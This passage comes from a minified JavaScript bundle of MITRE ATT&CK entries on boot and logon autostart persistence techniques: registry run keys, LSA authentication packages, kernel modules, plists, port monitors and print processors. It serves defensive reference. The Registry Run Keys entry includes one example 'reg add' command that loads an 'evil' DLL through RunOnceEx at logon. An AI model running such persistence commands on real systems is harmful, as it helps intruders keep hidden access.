href='https:\u002F\u002Funit42.paloaltonetworks.com\u002Funit42-tropic-trooper-targets-taiwanese-government-and-fossil-fuel-provider-with-poison-ivy\u002F'\u003E[6]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAdversaries can abuse these components to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1036'\u003EMasquerading\u003C\u002Fa\u003E to make the Registry entries look as if they are associated with legitimate programs.";ks.external_references=[{source_name:b,external_id:kt,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1547\u002F014"},{source_name:"Klein Active Setup 2010",url:"https:\u002F\u002Fhelgeklein.com\u002Fblog\u002F2010\u002F04\u002Factive-setup-explained\u002F",description:"Klein, H. (2010, April 22). Active Setup Explained. Retrieved December 18, 2020."},{source_name:"Mandiant Glyer APT 2010",url:"https:\u002F\u002Fdigital-forensics.sans.org\u002Fsummit-archives\u002F2010\u002F35-glyer-apt-persistence-mechanisms.pdf",description:"Glyer, C. (2010). Examples of Recent APT Persitence Mechanism. Retrieved December 18, 2020."},{source_name:"Citizenlab Packrat 2015",url:"https:\u002F\u002Fcitizenlab.ca\u002F2015\u002F12\u002Fpackrat-report\u002F",description:"Scott-Railton, J., et al. (2015, December 8). Packrat. Retrieved December 18, 2020."},{source_name:d_,url:d$,description:ea},{source_name:"SECURELIST Bright Star 2015",url:"https:\u002F\u002Fsecurelist.com\u002Fwhos-really-spreading-through-the-bright-star\u002F68978\u002F",description:"Baumgartner, K., Guerrero-Saade, J. (2015, March 4). Who’s Really Spreading through the Bright Star?. Retrieved December 18, 2020."},{source_name:"paloalto Tropic Trooper 2016",url:"https:\u002F\u002Funit42.paloaltonetworks.com\u002Funit42-tropic-trooper-targets-taiwanese-government-and-fossil-fuel-provider-with-poison-ivy\u002F",description:"Ray, V., et al. (2016, November 22). Tropic Trooper Targets Taiwanese Government and Fossil Fuel Provider With Poison Ivy. Retrieved December 18, 2020."},{url:y,description:z,source_name:A}];ks["subtechnique-of"]=v;ku.id=kv;ku["object-type"]=a;ku.name="Authentication Package";ku.description="Adversaries may abuse authentication packages to execute DLLs when the system boots. Windows authentication package DLLs are loaded by the Local Security Authority (LSA) process at system start. They provide support for multiple logon processes and multiple security protocols to the operating system. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Fwindows\u002Fdesktop\u002Faa374733.aspx'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAdversaries can use the autostart mechanism provided by LSA authentication packages for persistence by placing a reference to a binary in the Windows Registry location \u003Ccode\u003EHKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\\u003C\u002Fcode\u003E with the key value of \u003Ccode\u003E\"Authentication Packages\"=&lt;target binary&gt;\u003C\u002Fcode\u003E. The binary will then be executed by the system when the authentication packages are loaded.";ku.external_references=[{source_name:b,external_id:kv,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1547\u002F002"},{url:kg,description:kh,source_name:ki},{url:eb,description:ec,source_name:ed},{url:kw,description:kx,source_name:ky}];ku["subtechnique-of"]=v;kz.id=kA;kz["object-type"]=a;kz.name="Kernel Modules and Extensions";kz.description="Adversaries may modify the kernel to automatically execute programs on system boot. Loadable Kernel Modules (LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.tldp.org\u002FLDP\u002Flkmpg\u002F2.4\u002Flkmpg.pdf'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \n\nWhen used maliciously, LKMs can be a type of kernel-mode \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1014'\u003ERootkit\u003C\u002Fa\u003E that run with the highest operating system privilege (Ring 0). \u003Csup\u003E\u003Ca href='http:\u002F\u002Fwww.tldp.org\u002FLDP\u002Flkmpg\u002F2.4\u002Fhtml\u002Fx437.html'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Common features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users. \u003Csup\u003E\u003Ca href='http:\u002F\u002Fwww.megasecurity.org\u002Fpapers\u002FRootkits.pdf'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nKernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through \u003Ccode\u003Ekextload\u003C\u002Fcode\u003E and \u003Ccode\u003Ekextunload\u003C\u002Fcode\u003E commands. Since macOS Catalina 10.15, kernel extensions have been deprecated on macOS systems.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdeveloper.apple.com\u002Fsupport\u002Fkernel-extensions\u002F'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAdversaries can use LKMs and kexts to covertly persist on a system and elevate privileges. Examples have been found in the wild and there are some open source projects. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fvolatility-labs.blogspot.com\u002F2012\u002F10\u002Fphalanx-2-revealed-using-volatility-to.html'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.crowdstrike.com\u002Fblog\u002Fhttp-iframe-injecting-linux-rootkit\u002F'\u003E[6]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fgithub.com\u002Ff0rb1dd3n\u002FReptile'\u003E[7]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fgithub.com\u002Fm0nad\u002FDiamorphine'\u003E[8]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.virusbulletin.com\u002Fuploads\u002Fpdf\u002Fconference\u002Fvb2014\u002FVB2014-Wardle.pdf'\u003E[9]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.synack.com\u002F2017\u002F09\u002F08\u002Fhigh-sierras-secure-kernel-extension-loading-is-broken\u002F'\u003E[10]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fsecurelist.com\u002Fthe-ventir-trojan-assemble-your-macos-spy\u002F67267\u002F'\u003E[11]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.trendmicro.com\u002Ftrendlabs-security-intelligence\u002Fskidmap-linux-malware-uses-rootkit-capabilities-to-hide-cryptocurrency-mining-payload\u002F'\u003E[12]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";kz.external_references=[{source_name:b,external_id:kA,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1547\u002F006"},{source_name:kp,url:kq,description:kr},{url:"http:\u002F\u002Fwww.tldp.org\u002FLDP\u002Flkmpg\u002F2.4\u002Fhtml\u002Fx437.html",description:"Pomerantz, O., Salzman, P. (2003, April 4). Modules vs Programs. Retrieved April 6, 2018.",source_name:"Linux Kernel Module Programming Guide"},{url:"http:\u002F\u002Fwww.megasecurity.org\u002Fpapers\u002FRootkits.pdf",description:"Chuvakin, A. (2003, February). An Overview of Rootkits. Retrieved April 6, 2018.",source_name:"iDefense Rootkit Overview"},{source_name:"Apple Kernel Extension Deprecation",url:"https:\u002F\u002Fdeveloper.apple.com\u002Fsupport\u002Fkernel-extensions\u002F",description:"Apple. (n.d.). Deprecated Kernel Extensions and System Extension Alternatives. Retrieved November 4, 2020."},{url:"https:\u002F\u002Fvolatility-labs.blogspot.com\u002F2012\u002F10\u002Fphalanx-2-revealed-using-volatility-to.html",description:"Case, A. (2012, October 10). Phalanx 2 Revealed: Using Volatility to Analyze an Advanced Linux Rootkit. Retrieved April 9, 2018.",source_name:"Volatility Phalanx2"},{url:kB,description:kC,source_name:kD},{url:"https:\u002F\u002Fgithub.com\u002Ff0rb1dd3n\u002FReptile",description:"Augusto, I. (2018, March 8). Reptile - LMK Linux rootkit. Retrieved April 9, 2018.",source_name:"GitHub Reptile"},{url:"https:\u002F\u002Fgithub.com\u002Fm0nad\u002FDiamorphine",description:"Mello, V. (2018, March 8). Diamorphine - LMK rootkit for Linux Kernels 2.6.x\u002F3.x\u002F4.x (x86 and x86_64). Retrieved April 9, 2018.",source_name:"GitHub Diamorphine"},{url:B,description:"Wardle, P. (2015, April). Malware Persistence on OS X Yosemite. Retrieved April 6, 2018.",source_name:"RSAC 2015 San Francisco Patrick Wardle"},{url:"https:\u002F\u002Fwww.synack.com\u002F2017\u002F09\u002F08\u002Fhigh-sierras-secure-kernel-extension-loading-is-broken\u002F",description:"Wardle, P. (2017, September 8). High Sierra’s ‘Secure Kernel Extension Loading’ is Broken. Retrieved April 6, 2018.",source_name:"Synack Secure Kernel Extension Broken"},{url:"https:\u002F\u002Fsecurelist.com\u002Fthe-ventir-trojan-assemble-your-macos-spy\u002F67267\u002F",description:"Mikhail, K. (2014, October 16). The Ventir Trojan: assemble your MacOS spy. Retrieved April 6, 2018.",source_name:"Securelist Ventir"},{source_name:"Trend Micro Skidmap",url:"https:\u002F\u002Fblog.trendmicro.com\u002Ftrendlabs-security-intelligence\u002Fskidmap-linux-malware-uses-rootkit-capabilities-to-hide-cryptocurrency-mining-payload\u002F",description:"Remillano, A., Urbanec, J. (2019, September 19). Skidmap Linux Malware Uses Rootkit Capabilities to Hide Cryptocurrency-Mining Payload. Retrieved June 4, 2020."},{url:"http:\u002F\u002Ftldp.org\u002FHOWTO\u002FModule-HOWTO\u002Fx197.html",description:"Henderson, B. (2006, September 24). How To Insert And Remove LKMs. Retrieved April 9, 2018.",source_name:"Linux Loadable Kernel Module Insert and Remove LKMs"},{url:"https:\u002F\u002Fen.wikipedia.org\u002Fwiki\u002FLoadable_kernel_module#Linux",description:"Wikipedia. (2018, March 17). Loadable kernel module. Retrieved April 9, 2018.",source_name:"Wikipedia Loadable Kernel Module"}];kz["subtechnique-of"]=v;kE.id=kF;kE["object-type"]=a;kE.name="LSASS Driver";kE.description="Adversaries may modify or add LSASS drivers to obtain persistence on compromised systems. The Windows security subsystem is a set of components that manage and enforce the security policy for a computer or domain. The Local Security Authority (LSA) is the main component responsible for local security policy and user authentication. The LSA includes multiple dynamic link libraries (DLLs) associated with various other security functions, all of which run in the context of the LSA Subsystem Service (LSASS) lsass.exe process. \u003Csup\u003E\u003Ca href='https:\u002F\u002Ftechnet.microsoft.com\u002Flibrary\u002Fcc961760.aspx'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAdversaries may target LSASS drivers to obtain persistence. By either replacing or adding illegitimate drivers (e.g., \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1574'\u003EHijack Execution Flow\u003C\u002Fa\u003E), an adversary can use LSA operations to continuously execute malicious payloads.";kE.external_references=[{source_name:b,external_id:kF,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1547\u002F008"},{url:"https:\u002F\u002Ftechnet.microsoft.com\u002Flibrary\u002Fcc961760.aspx",description:"Microsoft. (n.d.). Security Subsystem Architecture. Retrieved November 27, 2017.",source_name:"Microsoft Security Subsystem"},{url:"https:\u002F\u002Ftechnet.microsoft.com\u002Flibrary\u002Fdn408187.aspx",description:"Microsoft. (2014, March 12). Configuring Additional LSA Protection. Retrieved November 27, 2017.",source_name:"Microsoft LSA Protection Mar 2014"},{url:"https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Fwindows\u002Fdesktop\u002Fff919712.aspx",description:"Microsoft. (n.d.). Dynamic-Link Library Security. Retrieved November 27, 2017.",source_name:"Microsoft DLL Security"},{url:y,description:z,source_name:A}];kE["subtechnique-of"]=v;kG.id=kH;kG["object-type"]=a;kG.name="Plist Modification";kG.description="Adversaries may modify plist files to run a program during system boot or user login. Property list (plist) files contain all of the information that macOS and OS X uses to configure applications and services. These files are UTF-8 encoded and formatted like XML documents via a series of keys surrounded by \u003C \u003E. They detail when programs should execute, file paths to the executables, program arguments, required OS permissions, and many others. plists are located in certain locations depending on their purpose such as \u003Ccode\u003E\u002FLibrary\u002FPreferences\u003C\u002Fcode\u003E (which execute with elevated privileges) and \u003Ccode\u003E~\u002FLibrary\u002FPreferences\u003C\u002Fcode\u003E (which execute with a user's privileges). \n\nAdversaries can modify plist files to execute their code as part of establishing persistence. plists may also be used to elevate privileges since they may execute in the context of another user.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fresearchcenter.paloaltonetworks.com\u002F2016\u002F09\u002Funit42-sofacys-komplex-os-x-trojan\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \n\nA specific plist used for execution at login is \u003Ccode\u003Ecom.apple.loginitems.plist\u003C\u002Fcode\u003E.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.virusbulletin.com\u002Fuploads\u002Fpdf\u002Fconference\u002Fvb2014\u002FVB2014-Wardle.pdf'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Applications under this plist run under the logged in user's context, and will be started every time the user logs in. Login items installed using the Service Management Framework are not visible in the System Preferences and can only be removed by the application that created them.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdeveloper.apple.com\u002Flibrary\u002Fcontent\u002Fdocumentation\u002FMacOSX\u002FConceptual\u002FBPSystemStartup\u002FChapters\u002FCreatingLoginItems.html'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Users have direct control over login items installed using a shared file list which are also visible in System Preferences \u003Csup\u003E\u003Ca href='https:\u002F\u002Fdeveloper.apple.com\u002Flibrary\u002Fcontent\u002Fdocumentation\u002FMacOSX\u002FConceptual\u002FBPSystemStartup\u002FChapters\u002FCreatingLoginItems.html'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E. Some of these applications can open visible dialogs to the user, but they don’t all have to since there is an option to \"hide\" the window. If an adversary can register their own login item or modified an existing one, then they can use it to execute their code for a persistence mechanism each time the user logs in \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.virusbulletin.com\u002Fuploads\u002Fpdf\u002Fconference\u002Fvb2014\u002FVB2014-Wardle.pdf'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.malwarebytes.com\u002Fthreat-analysis\u002F2017\u002F04\u002Fnew-osx-dok-malware-intercepts-web-traffic\u002F'\u003E[6]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E. The API method \u003Ccode\u003E SMLoginItemSetEnabled\u003C\u002Fcode\u003E can be used to set Login Items, but scripting languages like \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1059\u002F002'\u003EAppleScript\u003C\u002Fa\u003E can do this as well. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fdeveloper.apple.com\u002Flibrary\u002Fcontent\u002Fdocumentation\u002FMacOSX\u002FConceptual\u002FBPSystemStartup\u002FChapters\u002FCreatingLoginItems.html'\u003E[7]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";kG.external_references=[{source_name:b,external_id:kH,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1547\u002F011"},{url:bl,description:bm,source_name:bn},{url:B,description:S,source_name:T},{url:"https:\u002F\u002Fdeveloper.apple.com\u002Flibrary\u002Fcontent\u002Fdocumentation\u002FMacOSX\u002FConceptual\u002FBPSystemStartup\u002FChapters\u002FCreatingLoginItems.html",description:"Apple. (2016, September 13). Adding Login Items. Retrieved July 11, 2017.",source_name:"Adding Login Items"},{url:B,description:ee,source_name:ef},{url:dK,description:dL,source_name:dM}];kG["subtechnique-of"]=v;kI.id=kJ;kI["object-type"]=a;kI.name="Port Monitors";kI.description="Adversaries may use port monitors to run an attacker supplied DLL during system boot for persistence or privilege escalation. A port monitor can be set through the \u003Ccode\u003EAddMonitor\u003C\u002Fcode\u003E API call to set a DLL to be loaded at startup. \u003Csup\u003E\u003Ca href='http:\u002F\u002Fmsdn.microsoft.com\u002Fen-us\u002Flibrary\u002Fdd183341'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E This DLL can be located in \u003Ccode\u003EC:\\Windows\\System32\u003C\u002Fcode\u003E and will be loaded by the print spooler service, spoolsv.exe, on boot. The spoolsv.exe process also runs under SYSTEM level permissions. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.defcon.org\u002Fimages\u002Fdefcon-22\u002Fdc-22-presentations\u002FBloxham\u002FDEFCON-22-Brady-Bloxham-Windows-API-Abuse-UPDATED.pdf'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Alternatively, an arbitrary DLL can be loaded if permissions allow writing a fully-qualified pathname for that DLL to \u003Ccode\u003EHKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors\u003C\u002Fcode\u003E. \n\nThe Registry key contains entries for the following:\n\n* Local Port\n* Standard TCP\u002FIP Port\n* USB Monitor\n* WSD Port\n\nAdversaries can use this technique to load malicious code at startup that will persist on system reboot and execute as SYSTEM.";kI.external_references=[{source_name:b,external_id:kJ,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1547\u002F010"},{url:"http:\u002F\u002Fmsdn.microsoft.com\u002Fen-us\u002Flibrary\u002Fdd183341",description:"Microsoft. (n.d.). AddMonitor function. Retrieved November 12, 2014.",source_name:"AddMonitor"},{url:"https:\u002F\u002Fwww.defcon.org\u002Fimages\u002Fdefcon-22\u002Fdc-22-presentations\u002FBloxham\u002FDEFCON-22-Brady-Bloxham-Windows-API-Abuse-UPDATED.pdf",description:"Bloxham, B. (n.d.). Getting Windows to Play with Itself &#91;PowerPoint slides&#93;. Retrieved November 12, 2014.",source_name:"Bloxham"},{url:y,description:z,source_name:A}];kI["subtechnique-of"]=v;kK.id=kL;kK["object-type"]=a;kK.name="Print Processors";kK.description="Adversaries may abuse print processors to run malicious DLLs during system boot for persistence and\u002For privilege escalation. Print processors are DLLs that are loaded by the print spooler service, spoolsv.exe, during boot. \n\nAdversaries may abuse the print spooler service by adding print processors that load malicious DLLs at startup. A print processor can be installed through the \u003Ccode\u003EAddPrintProcessor\u003C\u002Fcode\u003E API call with an account that has \u003Ccode\u003ESeLoadDriverPrivilege\u003C\u002Fcode\u003E enabled. Alternatively, a print processor can be registered to the print spooler service by adding the \u003Ccode\u003EHKLM\\SYSTEM\\\\[CurrentControlSet or ControlSet001]\\Control\\Print\\Environments\\\\[Windows architecture: e.g., Windows x64]\\Print Processors\\\\[user defined]\\Driver\u003C\u002Fcode\u003E Registry key that points to the DLL. For the print processor to be correctly installed, it must be located in the system print-processor directory that can be found with the \u003Ccode\u003EGetPrintProcessorDirectory\u003C\u002Fcode\u003E API call.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fwindows\u002Fwin32\u002Fprintdocs\u002Faddprintprocessor'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E After the print processors are installed, the print spooler service, which starts during boot, must be restarted in order for them to run.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.welivesecurity.com\u002F2020\u002F05\u002F21\u002Fno-game-over-winnti-group\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E The print spooler service runs under SYSTEM level permissions, therefore print processors installed by an adversary may run under elevated privileges.";kK.external_references=[{source_name:b,external_id:kL,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1547\u002F012"},{source_name:"Microsoft AddPrintProcessor May 2018",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fwindows\u002Fwin32\u002Fprintdocs\u002Faddprintprocessor",description:"Microsoft. (2018, May 31). AddPrintProcessor function. Retrieved October 5, 2020."},{source_name:"ESET PipeMon May 2020",url:"https:\u002F\u002Fwww.welivesecurity.com\u002F2020\u002F05\u002F21\u002Fno-game-over-winnti-group\u002F",description:"Tartare, M. et al. (2020, May 21). No “Game over” for the Winnti Group. Retrieved August 24, 2020."}];kK["subtechnique-of"]=v;kM.id=kN;kM["object-type"]=a;kM.name="Re-opened Applications";kM.description="Adversaries may modify plist files to automatically run an application when a user logs in. Starting in Mac OS X 10.7 (Lion), users can specify certain applications to be re-opened when a user logs into their machine after reboot. While this is usually done via a Graphical User Interface (GUI) on an app-by-app basis, there are property list files (plist) that contain this information as well located at \u003Ccode\u003E~\u002FLibrary\u002FPreferences\u002Fcom.apple.loginwindow.plist\u003C\u002Fcode\u003E and \u003Ccode\u003E~\u002FLibrary\u002FPreferences\u002FByHost\u002Fcom.apple.loginwindow.* .plist\u003C\u002Fcode\u003E. \n\nAn adversary can modify one of these files directly to include a link to their malicious executable to provide a persistence mechanism each time the user reboots their machine \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.virusbulletin.com\u002Fuploads\u002Fpdf\u002Fconference\u002Fvb2014\u002FVB2014-Wardle.pdf'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E.";kM.external_references=[{source_name:b,external_id:kN,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1547\u002F007"},{url:B,description:S,source_name:T}];kM["subtechnique-of"]=v;kO.id=kP;kO["object-type"]=a;kO.name="Registry Run Keys \u002F Startup Folder";kO.description="Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. \u003Csup\u003E\u003Ca href='http:\u002F\u002Fmsdn.microsoft.com\u002Fen-us\u002Flibrary\u002Faa376977'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E These programs will be executed under the context of the user and will have the account's associated permissions level.\n\nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is \u003Ccode\u003EC:\\Users\\\\[Username]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\u003C\u002Fcode\u003E. The startup folder path for all users is \u003Ccode\u003EC:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\u003C\u002Fcode\u003E.\n\nThe following run keys are created by default on Windows systems:\n\n* \u003Ccode\u003EHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\u003C\u002Fcode\u003E\n* \u003Ccode\u003EHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\u003C\u002Fcode\u003E\n* \u003Ccode\u003EHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\u003C\u002Fcode\u003E\n* \u003Ccode\u003EHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\u003C\u002Fcode\u003E\n\nRun keys may exist under multiple hives.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fwindows\u002Fwin32\u002Fsysinfo\u002F32-bit-and-64-bit-application-data-in-the-registry'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.malwarebytes.com\u002Fcybercrime\u002F2013\u002F10\u002Fhiding-in-plain-sight\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E The \u003Ccode\u003EHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\u003C\u002Fcode\u003E is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fsupport.microsoft.com\u002Fhelp\u002F310593\u002Fdescription-of-the-runonceex-registry-key'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: \u003Ccode\u003Ereg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend \u002Fv 1 \u002Fd \"C:\\temp\\evil[.]dll\"\u003C\u002Fcode\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Foddvar.moe\u002F2018\u002F03\u002F21\u002Fpersistence-using-runonceex-hidden-from-autoruns-exe\u002F'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nThe following Registry keys can be used to set startup folder items for persistence:\n\n* \u003Ccode\u003EHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\u003C\u002Fcode\u003E\n* \u003Ccode\u003EHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\u003C\u002Fcode\u003E\n* \u003Ccode\u003EHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\u003C\u002Fcode\u003E\n* \u003Ccode\u003EHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\u003C\u002Fcode\u003E\n\nThe following Registry keys can control automatic startup of services during boot:\n\n* \u003Ccode\u003EHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\u003C\u002Fcode\u003E\n* \u003Ccode\u003EHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\u003C\u002Fcode\u003E\n* \u003Ccode\u003EHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\u003C\u002Fcode\u003E\n* \u003Ccode\u003EHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\u003C\u002Fcode\u003E\n\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\n\n* \u003Ccode\u003EHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\u003C\u002Fcode\u003E\n* \u003Ccode\u003EHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\u003C\u002Fcode\u003E\n\nThe Winlogon key controls actions that occur when a user logs on to a computer running Windows 7. Most of these actions are under the control of the operating system, but you can also add custom actions here. The \u003Ccode\u003EHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit\u003C\u002Fcode\u003E and \u003Ccode\u003EHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell\u003C\u002Fcode\u003E subkeys can automatically launch programs.\n\nPrograms listed in the load value of the registry key \u003Ccode\u003EHKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\u003C\u002Fcode\u003E run when any user logs on.\n\nBy default, the multistring \u003Ccode\u003EBootExecute\u003C\u002Fcode\u003E value of the registry key \u003Ccode\u003EHKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\u003C\u002Fcode\u003E is set to \u003Ccode\u003Eautocheck autochk *\u003C\u002Fcode\u003E. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\n\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1036'\u003EMasquerading\u003C\u002Fa\u003E to make the Registry entries look as if they are associated with legitimate programs.";kO.external_references=[{source_name:b,external_id:kP,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1547\u002F001"},{external_id:"CAPEC-270",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F270.html"},{url:kd,description:ke,source_name:kf},{source_name:"Microsoft Wow6432Node 2018",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fwindows\u002Fwin32\u002Fsysinfo\u002F32-bit-and-64-bit-application-data-in-the-registry",description:"Microsoft. (2018, May 31). 32-bit and 64-bit Application Data in the Registry. Retrieved August 3, 2020."},{source_name:"Malwarebytes Wow6432Node 2016",url:"https:\u002F\u002Fblog.malwarebytes.com\u002Fcybercrime\u002F2013\u002F10\u002Fhiding-in-plain-sight\u002F",description:"Arntz, P. (2016, March 30). Hiding in Plain Sight. Retrieved August 3, 2020."},{url:"https:\u002F\u002Fsupport.microsoft.com\u002Fhelp\u002F310593\u002Fdescription-of-the-runonceex-registry-key",description:"Microsoft. (2018, August 20). Description of the RunOnceEx Registry Key. Retrieved June 29, 2018.",source_name:"Microsoft RunOnceEx APR 2018"},{url:"https:\u002F\u002Foddvar.moe\u002F2018\u002F03\u002F21\u002Fpersistence-using-runonceex-hidden-from-autoruns-exe\u002F",description:"Moe, O. (2018, March 21). Persistence using RunOnceEx - Hidden from Autoruns.exe. Retrieved June 29, 2018.",source_name:"Oddvar Moe RunOnceEx Mar 2018"},{url:y,description:z,source_name:A}];kO["subtechnique-of"]=v;kQ.id=kR;kQ["object-type"]=a;kQ.name="Security Support Provider";kQ.description="Adversaries may abuse security support providers (SSPs) to execute DLLs when the system boots. Windows SSP DLLs are loaded into the Local Security Authority (LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's 